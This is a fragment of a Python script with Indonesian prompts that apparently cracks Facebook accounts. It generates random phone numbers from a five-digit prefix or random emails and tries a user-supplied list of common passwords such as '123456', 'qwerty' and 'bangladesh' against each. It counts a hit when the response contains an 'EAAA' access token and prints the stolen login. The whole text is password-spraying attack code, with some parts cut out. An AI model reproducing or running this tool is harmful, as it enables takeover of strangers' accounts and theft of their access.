  ...
  try:
    for pw in passs:
      ...
      if re.search('(EAAA)\w+', str(response.text)):
        print('  [AMBIL] %s -> %s '%(str(user), str(pw)))
        break
...
def random_numbers():
  ...
  Isi nomor awalnya ya sayang
  Harus 5 digit gak boleh kurang dan gak boleh lebih.
  Contoh: 62877
  ''')
  kode=str(input('  Masukan nomor awal: '))
  exit('  Nomor harus 5 digit ya sayang ga boleh kurang.') if len(kode) < 5 else ''
  exit('  Nomor harus 5 digit ya sayang ga boleh lebih.') if len(kode) > 5 else ''
  jml=int(input('''
  ...
  print('''
  Semoga hari ini kmu beruntung sayang :)
  Tunggu ya sayang jgn di tutup....
  ''')
...
def random_email():
  ...
  contoh: putri123,putri1234,111111,bangladesh,102030,786786, Pakistan,123,1234,12345,123456,qwerty,654321,123123,1234567890,allah
  Set password: ''').split(',')
